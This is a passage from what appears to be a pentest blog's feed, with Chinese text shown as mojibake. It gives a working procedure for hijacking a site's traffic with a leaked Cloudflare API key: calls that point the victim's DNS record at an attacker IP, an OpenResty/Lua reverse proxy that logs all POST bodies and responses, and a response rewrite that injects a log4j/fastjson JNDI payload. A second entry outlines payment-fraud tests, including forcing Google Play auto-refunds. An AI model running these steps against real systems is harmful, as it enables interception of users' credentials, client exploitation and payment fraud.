language-bash" data-language="bash"><code class="language-bash">POST https://api.cloudflare.com/client/v4/zones/<span class="token operator">&lt;</span>Zone ID<span class="token operator">></span>/dns_records<span class="token punctuation">&#123;</span><span class="token string">"type"</span><span class="token builtin class-name">:</span><span class="token string">"TXT"</span>, <span class="token string">"name"</span><span class="token builtin class-name">:</span><span class="token string">"_acme-challenge.&lt;victim.com>"</span>, <span class="token string">"content"</span><span class="token builtin class-name">:</span><span class="token string">"TK..."</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="åˆ é™¤DNS-Record"><a href="#åˆ é™¤DNS-Record" class="headerlink" title="åˆ é™¤DNS Record"></a>åˆ é™¤DNS Record</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">DELETE https://api.cloudflare.com/client/v4/zones/<span class="token operator">&lt;</span>Zone ID<span class="token operator">></span>/dns_records/<span class="token operator">&lt;</span>DNS Record ID<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="æ­¥éª¤"><a href="#æ­¥éª¤" class="headerlink" title="æ­¥éª¤"></a>æ­¥éª¤</h2><p>ä¸ç®¡æ˜¯CNAMEè§£æè¿˜æ˜¯Aè§£æéƒ½å¯ä»¥ä¿®æ”¹ä¸ºAè§£æçš„æ–¹å¼ï¼ŒåŠ«æŒåŸŸååˆ°è‡ªå·±çš„æœåŠ¡å™¨ï¼Œå‰ææ˜¯ä½¿ç”¨OpenRestyæŠŠåä»£è®¾ç½®å¥½ï¼Œé…ç½®æ–‡ä»¶ä¸»è¦å‚è€ƒ<a href="https://gist.github.com/virusdefender/984c2a304001d8de20049301b478700a/revisions">virusdefenderå¸ˆå‚…</a>ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">server <span class="token punctuation">&#123;</span>    listen <span class="token number">80</span><span class="token punctuation">;</span>    server_name <span class="token operator">&lt;</span>victim.com<span class="token operator">></span><span class="token punctuation">;</span>    <span class="token builtin class-name">return</span> <span class="token number">301</span> https://<span class="token operator">&lt;</span>victim.com<span class="token operator">></span><span class="token variable">$request_uri</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>server <span class="token punctuation">&#123;</span>listen <span class="token number">443</span> ssl<span class="token punctuation">;</span>server_name <span class="token operator">&lt;</span>victim.com<span class="token operator">></span><span class="token punctuation">;</span>    proxy_ssl_server_name on<span class="token punctuation">;</span>    proxy_ssl_name <span class="token operator">&lt;</span>victim.com<span class="token operator">></span><span class="token punctuation">;</span>    ssl_certificate /root/.acme.sh/<span class="token operator">&lt;</span>victim.com<span class="token operator">></span>/fullchain.cer<span class="token punctuation">;</span>    ssl_certificate_key /root/.acme.sh/<span class="token operator">&lt;</span>victim.com<span class="token operator">></span>/<span class="token operator">&lt;</span>victim.com<span class="token operator">></span><span class="token punctuation">;</span>error_log stderr error<span class="token punctuation">;</span>location / <span class="token punctuation">&#123;</span>proxy_pass https://<span class="token operator">&lt;</span>victim.com<span class="token operator">></span><span class="token punctuation">;</span>proxy_set_header X-Real-IP <span class="token variable">$remote_addr</span><span class="token punctuation">;</span>        proxy_set_header X-Forwarded-For <span class="token variable">$remote_addr</span><span class="token punctuation">;</span>proxy_set_header User-Agent <span class="token variable">$http_user_agent</span><span class="token punctuation">;</span>proxy_set_header referer <span class="token string">"https://&lt;victim.com><span class="token variable">$request_uri</span>"</span><span class="token punctuation">;</span>proxy_set_header Host <span class="token variable">$host</span><span class="token punctuation">;</span><span class="token builtin class-name">set</span> <span class="token variable">$resp_body</span> <span class="token string">""</span><span class="token punctuation">;</span>        <span class="token builtin class-name">set</span> <span class="token variable">$req_body</span> <span class="token string">""</span><span class="token punctuation">;</span>        access_by_lua <span class="token string">'            ngx.req.read_body();        '</span><span class="token punctuation">;</span>        body_filter_by_lua <span class="token string">'            ngx.ctx.buffered = (ngx.ctx.buffered or "") .. ngx.arg[1]            if ngx.arg[2] then                ngx.var.resp_body = ngx.ctx.buffered            end        '</span><span class="token punctuation">;</span>        log_by_lua <span class="token string">'        local method=ngx.req.get_method();        if method == "POST" or (method == "PUT") or (method == "DELETE") then            ngx.log(ngx.ERR, "\\n".. ngx.req.raw_header());            if ngx.req.get_body_data() ~= nil then                ngx.log(ngx.ERR, "\\n====Request===>\\n" .. ngx.req.get_body_data() .. "\\n\\n&lt;===Request====\\n");            end            ngx.log(ngx.ERR, "\\n====Response===>\\n" .. ngx.var.resp_body .. "\\n&lt;===Response====\\n");        end        '</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>access_log /home/wwwlogs/access.log<span class="token punctuation">;</span>error_log /home/wwwlogs/error.log<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¦‚æœæƒ³çœ‹è®°å½•æ‰€æœ‰çš„è¯·æ±‚ï¼ŒæŠŠä¸Šé¢çš„è¯·æ±‚æ–¹æ³•åˆ¤æ–­å»æ‰å°±å¯ä»¥äº†ã€‚</p><h3 id="X-Forwarded-Forå­—æ®µ"><a href="#X-Forwarded-Forå­—æ®µ" class="headerlink" title="X-Forwarded-Forå­—æ®µ"></a>X-Forwarded-Forå­—æ®µ</h3><p>å‡å¦‚éœ€è¦åŠ«æŒçš„æ˜¯ä¸€ä¸ªä¸­é—´ä»£ç†åŸŸåï¼Œä¸Šæ¸¸æœåŠ¡å™¨æ˜¯é€šè¿‡ç™½åå•IPæ¥é™åˆ¶è®¿é—®ï¼Œè·å–IPçš„æ–¹å¼æ˜¯é€šè¿‡XFFï¼Œè¿™æ—¶å€™éœ€è¦æŠŠXFFè®¾ç½®ä¸º<code>$remote_addr</code></p><h3 id="Hostå­—æ®µ"><a href="#Hostå­—æ®µ" class="headerlink" title="Hostå­—æ®µ"></a>Hostå­—æ®µ</h3><p>è¿™é‡Œæœ‰ä¸€ä¸ªå¾ˆå¥‡æ€ªçš„é—®é¢˜ï¼Œå¤§æ¦‚æ˜¯å–å†³äºupstreamçš„é…ç½®ï¼Œæœ‰æ—¶å€™éœ€è¦é…ç½®ä¸º<code>proxy_set_header Host $host</code>ï¼Œä½†æ˜¯æœ‰æ—¶å€™å¯èƒ½æ˜¯<code>proxy_set_header Host $proxy_host</code>ã€‚</p><p>åœ¨ä»¥ä¸Šéƒ½è®¾ç½®å¥½ä¹‹åï¼Œåˆ©ç”¨æœ¬åœ°hostsç»‘å®šçš„æ–¹å¼å…ˆæµ‹è¯•ç½‘ç«™çš„æ¥å£åŠŸèƒ½æ˜¯å¦æ­£å¸¸ï¼Œç”Ÿæˆçš„æ—¥å¿—æ˜¯å¦æ­£å¸¸ã€‚å¦å¤–å¯ä»¥ç»™80å’Œ443ç«¯å£å¦å¤–å•ç‹¬åšä¸€ä¸ªé»˜è®¤é…ç½®ï¼Œè¿™æ ·å¯ä»¥é˜²æ­¢æ‰«æå™¨ç­‰æ—¥å¿—å‡ºç°ï¼Œåªå•ç‹¬è®°å½•åä»£çš„æ—¥å¿—ï¼Œ<br>æ¯”å¦‚443ç«¯å£æ–°å¢ä¸€ä¸ªè‡ªå®šä¹‰è¯ä¹¦ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">openssl genrsa -out privatekey.pem <span class="token number">2048</span>openssl req -new -key privatekey.pem -out private-csr.pemopenssl x509 -req -days <span class="token number">365</span> -in private-csr.pem -signkey privatekey.pem -out certificate.pem<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ä¿®æ”¹OpenRestyé…ç½®:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">server <span class="token punctuation">&#123;</span>        listen       <span class="token number">443</span> ssl<span class="token punctuation">;</span>        server_name  localhost default<span class="token punctuation">;</span>        ssl_certificate      /usr/local/openresty/nginx/certs/certificate.pem<span class="token punctuation">;</span>        ssl_certificate_key  /usr/local/openresty/nginx/certs/privatekey.pem<span class="token punctuation">;</span>        ssl_session_cache    shared:SSL:1m<span class="token punctuation">;</span>        ssl_session_timeout  5m<span class="token punctuation">;</span>        ssl_ciphers  HIGH:<span class="token operator">!</span>aNULL:<span class="token operator">!</span>MD5<span class="token punctuation">;</span>        ssl_prefer_server_ciphers  on<span class="token punctuation">;</span>        location / <span class="token punctuation">&#123;</span>            root   html<span class="token punctuation">;</span>            index  index.html index.htm<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç»è¿‡ä¸Šé¢è®¾ç½®è¿™æ—¶å€™åä»£å·²ç»è®¾ç½®å¥½å¯ä»¥è¿›è¡Œæµé‡åŠ«æŒäº†ï¼Œå…ˆè®°å½•åŸæœ‰çš„DNSè§£æï¼Œç„¶åé€šè¿‡APIä¿®æ”¹åŸŸåçš„è§£æè®°å½•ï¼Œè§£æé“è‡ªå·±çš„æœåŠ¡å™¨ä¸Šï¼Œå¿…è¦çš„æƒ…å†µä¸‹éœ€è¦é‡æ–°æ”¹å›æ¥ï¼š</p><h4 id="ä¿®æ”¹è§£æè®°å½•"><a href="#ä¿®æ”¹è§£æè®°å½•" class="headerlink" title="ä¿®æ”¹è§£æè®°å½•"></a>ä¿®æ”¹è§£æè®°å½•</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">PUT https://api.cloudflare.com/client/v4/zones/<span class="token operator">&lt;</span>ZONE ID<span class="token operator">></span>/dns_records/<span class="token operator">&lt;</span>DNS Record ID<span class="token operator">></span><span class="token punctuation">&#123;</span><span class="token string">"type"</span><span class="token builtin class-name">:</span><span class="token string">"A"</span>, <span class="token string">"name"</span><span class="token builtin class-name">:</span><span class="token string">"&lt;victim.com>"</span>, <span class="token string">"content"</span><span class="token builtin class-name">:</span><span class="token string">"&lt;attack ip>"</span>, <span class="token string">"proxiable"</span><span class="token builtin class-name">:</span> false, <span class="token string">"proxied"</span><span class="token builtin class-name">:</span> false<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="ä¿®æ”¹Response"><a href="#ä¿®æ”¹Response" class="headerlink" title="ä¿®æ”¹Response"></a>ä¿®æ”¹Response</h2><p>å¦‚æœæœ‰å…¶ä»–çš„éœ€æ±‚ï¼Œæ¯”å¦‚ä¿®æ”¹Responseç”¨æ¥æµ‹è¯•å®¢æˆ·ç«¯æ˜¯å¦å­˜åœ¨fastjsonæˆ–è€…log4jæ¼æ´ï¼Œå¯ä»¥å¢åŠ ä»¥ä¸‹Luaä»£ç ï¼Œæ¥ä¿®æ”¹ç‰¹å®šçš„æ¥å£è¿”å›å€¼ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">location /some-api <span class="token punctuation">&#123;</span>proxy_pass https://<span class="token operator">&lt;</span>victim.com<span class="token operator">></span><span class="token punctuation">;</span>proxy_set_header X-Real-IP <span class="token variable">$remote_addr</span><span class="token punctuation">;</span>        proxy_set_header X-Forwarded-For <span class="token variable">$proxy_add_x_forwarded_for</span> <span class="token punctuation">;</span>proxy_set_header User-Agent <span class="token variable">$http_user_agent</span><span class="token punctuation">;</span>proxy_set_header referer <span class="token string">"https://&lt;victim.com><span class="token variable">$request_uri</span>"</span><span class="token punctuation">;</span>proxy_set_header Host   <span class="token variable">$proxy_host</span><span class="token punctuation">;</span><span class="token builtin class-name">set</span> <span class="token variable">$resp_body</span> <span class="token string">""</span><span class="token punctuation">;</span>        <span class="token builtin class-name">set</span> <span class="token variable">$req_body</span> <span class="token string">""</span><span class="token punctuation">;</span>        access_by_lua <span class="token string">'            ngx.req.read_body();        '</span><span class="token punctuation">;</span>        header_filter_by_lua_block <span class="token punctuation">&#123;</span> ngx.header.content_length <span class="token operator">=</span> nil <span class="token punctuation">&#125;</span>        body_filter_by_lua <span class="token string">'            local chunk, eof = ngx.arg[1], ngx.arg[2]            local buffered = ngx.ctx.buffered            if not buffered then            buffered = &#123;&#125;  -- XXX we can use table.new here             ngx.ctx.buffered = buffered            end            if chunk ~= "" then            buffered[#buffered + 1] = chunk            ngx.arg[1] = nil            end            if eof then            local whole = table.concat(buffered)            ngx.ctx.buffered = nil            -- try to unzip            -- local status, debody = pcall(com.decode, whole)             -- if status then whole = debody end            -- try to add or replace response body            -- local js_code = ...            -- whole = whole .. js_code            ngx.log(ngx.ERR, whole)            whole = string.gsub(whole, ".+",  "&#123;\\"@type\\":\\"java.net.Inet6Address\\",\\"value\\":\\"dnslog\\", \\"message\\":\\"$&#123;jndi:ldap://dnslog&#125;\\"&#125;")            ngx.arg[1] = whole            end        '</span><span class="token punctuation">;</span>        log_by_lua <span class="token string">'        local method=ngx.req.get_method();         if method == "POST" or (method == "PUT") or (method == "DELETE") then            ngx.log(ngx.ERR, "\\n".. ngx.req.raw_header());            if ngx.req.get_body_data() ~= nil then                 ngx.log(ngx.ERR, "\\n====Request===>\\n" .. ngx.req.get_body_data() .. "\\n\\n&lt;===Request====\\n");            end                        ngx.log(ngx.ERR, "\\n====Response===>\\n" .. ngx.var.resp_body .. "\\n&lt;===Response====\\n");        end        '</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;èƒŒæ™¯&quot;&gt;&lt;a href=&quot;#èƒŒæ™¯&quot; class=&quot;headerlink&quot; title=&quot;èƒŒæ™¯&quot;&gt;&lt;/a&gt;èƒŒæ™¯&lt;/h2&gt;&lt;p&gt;æ”»å‡»è€…å…·æœ‰ä¿®æ”¹åŸŸåè§£æè®°å½•çš„æƒé™ï¼ˆæ¯”å¦‚æ‹¥æœ‰CloudFlareçš„API Keyï¼‰ï¼Œå¯ä»¥ä¿®æ”¹CNAMEæˆ–è€…Aè®°å½•ï¼Œæƒ³é€šè¿‡ä¿®æ”¹åŸŸåè§£æè®°å½•çš„æ–¹å¼ï¼Œè·å–ç›®æ ‡ç½‘ç«™çš„æ‰€æœ‰æµé‡ï¼ˆåŒ…æ‹¬ä½†ä¸é™äºPOSTæ˜æ–‡è¯·æ±‚ï¼‰ã€‚å¯ä»¥åˆ©ç”¨OpenRestyçš„Luaæ‰©å±•åŠŸèƒ½ï¼Œè®°å½•HTTPè¯·æ±‚ä½“å’Œç›¸åº”çš„Responseã€‚é¡ºå˜´æä¸€å¥ï¼Œåœ¨CloudFalreé‡Œé¢ï¼Œä¸€èˆ¬çš„æ¥å£æ“ä½œéƒ½å¯ä»¥ç”¨API Keyå®Œæˆï¼Œä½†æ˜¯ä¸€æ—¦æ¶‰åŠåˆ°è¯ä¹¦çš„ç»­è®¢ä¸‹è½½ç­‰æ“ä½œï¼Œéœ€è¦ç”¨CA Keyã€‚&lt;/p&gt;
&lt;h2 id=&quot;æ”»å‡»æµç¨‹&quot;&gt;&lt;a href=&quot;#æ”»å‡»æµç¨‹&quot; class=&quot;headerlink&quot; title=&quot;æ”»å‡»æµç¨‹&quot;&gt;&lt;/a&gt;æ”»å‡»æµç¨‹&lt;/h2&gt;&lt;p&gt;é¦–å…ˆå¯ä»¥é€šè¿‡APIæ¥å£æŸ¥çœ‹æ³„æ¼çš„keyæ˜¯å¦ç”Ÿæ•ˆï¼š&lt;/p&gt;
&lt;h4 id=&quot;æŸ¥çœ‹Zones&quot;&gt;&lt;a href=&quot;#æŸ¥çœ‹Zones&quot; class=&quot;headerlink&quot; title=&quot;æŸ¥çœ‹Zones&quot;&gt;&lt;/a&gt;æŸ¥çœ‹Zones&lt;/h4&gt;&lt;pre class=&quot;line-numbers language-bash&quot; data-language=&quot;bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;GET https://api.cloudflare.com/client/v4/zones&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&quot;æŸ¥çœ‹Zoneså¯¹åº”çš„DNSè®°å½•&quot;&gt;&lt;a href=&quot;#æŸ¥çœ‹Zoneså¯¹åº”çš„DNSè®°å½•&quot; class=&quot;headerlink&quot; title=&quot;æŸ¥çœ‹Zoneså¯¹åº”çš„DNSè®°å½•&quot;&gt;&lt;/a&gt;æŸ¥çœ‹Zoneså¯¹åº”çš„DNSè®°å½•&lt;/h4&gt;&lt;pre class=&quot;line-numbers language-bash&quot; data-language=&quot;bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;GET https://api.cloudflare.com/client/v4/zones/&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;ZONE ID&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;/dns_records&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&quot;æŸ¥çœ‹å®¡è®¡æ—¥å¿—&quot;&gt;&lt;a href=&quot;#æŸ¥çœ‹å®¡è®¡æ—¥å¿—&quot; class=&quot;headerlink&quot; title=&quot;æŸ¥çœ‹å®¡è®¡æ—¥å¿—&quot;&gt;&lt;/a&gt;æŸ¥çœ‹å®¡è®¡æ—¥å¿—&lt;/h4&gt;&lt;p&gt;è·å–æœ€è¿‘çš„ç™»é™†æ—¥å¿—ã€æ“ä½œæ—¥å¿—ã€å®¢æˆ·ç«¯IPç­‰ï¼š&lt;/p&gt;</summary>
    
    
    
    <category term="Pentest" scheme="https://jkme.github.io/categories/Pentest/"/>
    
    
  </entry>
  
  <entry>
    <title>æ”¯ä»˜æ¥å£å®‰å…¨æµ‹è¯•è®°å½•</title>
    <link href="https://jkme.github.io/2023/01/16/pay_vuln.html"/>
    <id>https://jkme.github.io/2023/01/16/pay_vuln.html</id>
    <published>2023-01-15T16:00:00.000Z</published>
    <updated>2023-01-16T10:10:18.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x1-ä½ä»·å€¼æ›¿æ¢é«˜ä»·å€¼SKU"><a href="#0x1-ä½ä»·å€¼æ›¿æ¢é«˜ä»·å€¼SKU" class="headerlink" title="0x1. ä½ä»·å€¼æ›¿æ¢é«˜ä»·å€¼SKU"></a>0x1. ä½ä»·å€¼æ›¿æ¢é«˜ä»·å€¼SKU</h3><p>åœ¨IOSå¹³å°ä¸Šé¢æ”¯ä»˜å®Œæˆä¹‹åï¼Œç«‹åˆ»æ€æ‰è¿›ç¨‹ï¼Œç„¶åé‡æ–°å¼€å¯APPæŠ“åŒ…ï¼Œæ­¤æ—¶è§¦å‘è¡¥å•æ“ä½œï¼Œæ‹¦æˆªåŒ…ä¹‹åï¼Œä¿®æ”¹skuå­—æ®µä¸ºé«˜ä»·å€¼å•†å“ï¼Œå°è¯•æ˜¯å¦å¯ä»¥æˆåŠŸã€‚</p><p>æˆ–è€…åœ¨BurpæŠ“æ”¯ä»˜åŒ…çš„æ—¶å€™ï¼Œå› ä¸ºappleæœåŠ¡æ¥å£éªŒè¯äº†è¯ä¹¦ï¼Œå¯ä»¥åœ¨burpçš„<code>TLS Pass Through</code>é…ç½®ç»•è¿‡appleçš„åŸŸåï¼Œä¸å¯¹å…¶è¿›è¡ŒæŠ“åŒ…ã€‚</p><h3 id="0x2-æ›¿æ¢è®¢å•å·"><a href="#0x2-æ›¿æ¢è®¢å•å·" class="headerlink" title="0x2. æ›¿æ¢è®¢å•å·"></a>0x2. æ›¿æ¢è®¢å•å·</h3><p>é¦–å…ˆäº§ç”Ÿä¸€ä¸ªæœªæ”¯ä»˜çš„é«˜ä»·å€¼çš„è®¢å•å·ï¼Œå…¶æ¬¡æ­£å¸¸è´­ä¹°ä½ä»·å€¼å•†å“ï¼Œæ‰“æ–­åç«¯è¿”å›çš„responseï¼Œæ›¿æ¢responseé‡Œé¢çš„è®¢å•å·ä¸ºé«˜ä»·å€¼è®¢å•å·ï¼Œç„¶åå°è¯•æ”¯ä»˜æˆåŠŸä¹‹åå•†å“çš„æ•°é‡ã€‚ä¸€èˆ¬é€‚ç”¨äºGoogleæ”¯ä»˜ã€‚</p><h3 id="0x3-åˆ©ç”¨Googleæœºåˆ¶è‡ªåŠ¨é€€æ¬¾"><a href="#0x3-åˆ©ç”¨Googleæœºåˆ¶è‡ªåŠ¨é€€æ¬¾" class="headerlink" title="0x3. åˆ©ç”¨Googleæœºåˆ¶è‡ªåŠ¨é€€æ¬¾"></a>0x3. åˆ©ç”¨Googleæœºåˆ¶è‡ªåŠ¨é€€æ¬¾</h3><p>Googleçš„SDKæ”¯ä»˜æˆåŠŸä¹‹åï¼Œå®¢æˆ·ç«¯ä¼šå‘èµ·ä¸€ä¸ªæ¥å£è¯·æ±‚: <a href="https://play-fe.googleapis.com/fdfe/consumePurchase">https://play-fe.googleapis.com/fdfe/consumePurchase</a> </p><p>Google Playç»“ç®—æœåŠ¡å®˜æ–¹æ–‡æ¡£ä¸­å…³äºå¤„ç†è´­ä¹°äº¤æ˜“çš„æè¿°ï¼šåœ¨ä¸‰å¤©å†…æœªç¡®è®¤è´­ä¹°äº¤æ˜“ï¼Œåˆ™ç”¨æˆ·ä¼šè‡ªåŠ¨æ”¶åˆ°é€€æ¬¾ï¼Œå¹¶ä¸”Google Playä¼šæ’¤æ¶ˆè¯¥è´­ä¹°äº¤æ˜“ï¼Œå¯ä»¥åˆ©ç”¨æ­¤è§„åˆ™è¿›è¡Œé€€æ¬¾ã€‚è¿™ç§æ”»å‡»ä¸€èˆ¬é’ˆå¯¹ä¸€æ¬¡æ€§æ¶ˆè€—å“ï¼Œå½“ç„¶é‡å¤çš„ä¹Ÿå¯ä»¥ã€‚åœ¨æ”¯ä»˜å®Œæˆä¹‹åï¼Œæ‹¦æˆªä¸Šé¢çš„è¯·æ±‚ä¹‹åä¸¢å¼ƒï¼Œå¦‚æœæœåŠ¡ç«¯æœªåšæ­£ç¡®å¤„ç†ï¼Œåˆ™ä¸‰å¤©ä¹‹åGoogleä¼šè‡ªåŠ¨é€€æ¬¾ã€‚</p><p>ä¿®å¤æ–¹å¼ï¼šåç«¯æ‰‹åŠ¨è°ƒç”¨ç¡®è®¤æ¥å£è¿›è¡ŒäºŒæ¬¡ç¡®è®¤<a href="https://developers.google.com/android-publisher/api-ref/rest/v3/purchases.products/acknowledge">acknowledge</a>ï¼Œä¸€èˆ¬400å¯ä»¥è§†ä¸ºå·²ç¡®è®¤ï¼Œ409çš„æ—¶å€™éœ€è¦æŸ¥è¯¢ä¸€æ¬¡çŠ¶æ€ï¼Œå·²ç¡®è®¤çŠ¶æ€å¯ä»¥æ”¾è¡Œï¼Œå¦åˆ™æ‰å•å¤„ç†ã€‚</p><h3 id="æµ‹è¯•æ³¨æ„ç‚¹"><a href="#æµ‹è¯•æ³¨æ„ç‚¹" class="headerlink" title="æµ‹è¯•æ³¨æ„ç‚¹"></a>æµ‹è¯•æ³¨æ„ç‚¹</h3><ul><li>æŸäº›ç‰ˆæœ¬çš„BurpæŠ“ä¸åˆ°Googleçš„æ¶ˆè´¹è¯·æ±‚ï¼Œæˆ–è€…æ˜¯Burpæ˜¾ç¤ºDF-DFERH-01é”™è¯¯ï¼Œè¿™æ—¶å€™å¤šæ›´æ¢burpç‰ˆæœ¬è¯•è¯•ï¼Œæ¯”å¦‚ç¤¾åŒºç‰ˆ</li><li>ç†Ÿç»ƒåˆ©ç”¨Burpçš„<code>TLS Pass Through</code>å’Œ<code>Intercept Client Requests</code>åŠŸèƒ½æŠ“åŒ…ã€‚</li></ul>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;0x1-ä½ä»·å€¼æ›¿æ¢é«˜ä»·å€¼SKU&quot;&gt;&lt;a href=&quot;#0x1-ä½ä»·å€¼æ›¿æ¢é«˜ä»·å€¼SKU&quot; class=&quot;headerlink&quot; title=&quot;0x1. ä½ä»·å€¼æ›¿æ¢é«˜ä»·å€¼SKU&quot;&gt;&lt;/a&gt;0x1. ä½ä»·å€¼æ›¿æ¢é«˜ä»·å€¼SKU&lt;/h3&gt;&lt;p&gt;åœ¨IOSå¹³å°ä¸Šé¢æ”¯ä»˜å®Œæˆä¹‹åï¼Œç«‹åˆ»æ€æ‰è¿›ç¨‹ï¼Œç„¶åé‡æ–°å¼€å¯APPæŠ“åŒ…ï¼Œæ­¤æ—¶è§¦å‘è¡¥å•æ“ä½œï¼Œæ‹¦æˆªåŒ…ä¹‹åï¼Œä¿®æ”¹skuå­—æ®µä¸ºé«˜ä»·å€¼å•†å“ï¼Œå°è¯•æ˜¯å¦å¯ä»¥æˆåŠŸã€‚&lt;/p&gt;
&lt;p&gt;æˆ–è€…åœ¨BurpæŠ“æ”¯ä»˜åŒ…çš„æ—¶å€™ï¼Œå› ä¸ºappleæœåŠ¡æ¥å£éªŒè¯äº†è¯ä¹¦ï¼Œå¯ä»¥åœ¨burpçš„&lt;code&gt;TLS Pass Through&lt;/code&gt;é…ç½®ç»•è¿‡appleçš„åŸŸåï¼Œä¸å¯¹å…¶è¿›è¡ŒæŠ“åŒ…ã€‚&lt;/p&gt;
&lt;h3 id=&quot;0x2-æ›¿æ¢è®¢å•å·&quot;&gt;&lt;a href=&quot;#0x2-æ›¿æ¢è®¢å•å·&quot; class=&quot;headerlink&quot; title=&quot;0x2. æ›¿æ¢è®¢å•å·&quot;&gt;&lt;/a&gt;0x2. æ›¿æ¢è®¢å•å·&lt;/h3&gt;&lt;p&gt;é¦–å…ˆäº§ç”Ÿä¸€ä¸ªæœªæ”¯ä»˜çš„é«˜ä»·å€¼çš„è®¢å•å·ï¼Œå…¶æ¬¡æ­£å¸¸è´­ä¹°ä½ä»·å€¼å•†å“ï¼Œæ‰“æ–­åç«¯è¿”å›çš„responseï¼Œæ›¿æ¢responseé‡Œé¢çš„è®¢å•å·ä¸ºé«˜ä»·å€¼è®¢å•å·ï¼Œç„¶åå°è¯•æ”¯ä»˜æˆåŠŸä¹‹åå•†å“çš„æ•°é‡ã€‚ä¸€èˆ¬é€‚ç”¨äºGoogleæ”¯ä»˜ã€‚&lt;/p&gt;
&lt;h3 id=&quot;0x3-åˆ©ç”¨Googleæœºåˆ¶è‡ªåŠ¨é€€æ¬¾&quot;&gt;&lt;a href=&quot;#0x3-åˆ©ç”¨Googleæœºåˆ¶è‡ªåŠ¨é€€æ¬¾&quot; class=&quot;headerlink&quot; title=&quot;0x3. åˆ©ç”¨Googleæœºåˆ¶è‡ªåŠ¨é€€æ¬¾&quot;&gt;&lt;/a&gt;0x3. åˆ©ç”¨Googleæœºåˆ¶è‡ªåŠ¨é€€æ¬¾&lt;/h3&gt;&lt;p&gt;Googleçš„SDKæ”¯ä»˜æˆåŠŸä¹‹åï¼Œå®¢æˆ·ç«¯ä¼šå‘èµ·ä¸€ä¸ªæ¥å£è¯·æ±‚: &lt;a href=&quot;https://play-fe.googleapis.com/fdfe/consumePurchase&quot;&gt;https://play-fe.googleapis.com/fdfe/consumePurchase&lt;/a&gt; &lt;/p&gt;
&lt;p&gt;Google Playç»“ç®—æœåŠ¡å®˜æ–¹æ–‡æ¡£ä¸­å…³äºå¤„ç†è´­ä¹°äº¤æ˜“çš„æè¿°ï¼šåœ¨ä¸‰å¤©å†…æœªç¡®è®¤è´­ä¹°äº¤æ˜“ï¼Œåˆ™ç”¨æˆ·ä¼šè‡ªåŠ¨æ”¶åˆ°é€€æ¬¾ï¼Œå¹¶ä¸”Google Playä¼šæ’¤æ¶ˆè¯¥è´­ä¹°äº¤æ˜“ï¼Œå¯ä»¥åˆ©ç”¨æ­¤è§„åˆ™è¿›è¡Œé€€æ¬¾ã€‚è¿™ç§æ”»å‡»ä¸€èˆ¬é’ˆå¯¹ä¸€æ¬¡æ€§æ¶ˆè€—å“ï¼Œå½“ç„¶é‡å¤çš„ä¹Ÿå¯ä»¥ã€‚åœ¨æ”¯ä»˜å®Œæˆä¹‹åï¼Œæ‹¦æˆªä¸Šé¢çš„è¯·æ±‚ä¹‹åä¸¢å¼ƒï¼Œå¦‚æœæœåŠ¡ç«¯æœªåšæ­£ç¡®å¤„ç†ï¼Œåˆ™ä¸‰å¤©ä¹‹åGoogleä¼šè‡ªåŠ¨é€€æ¬¾ã€‚&lt;/p&gt;
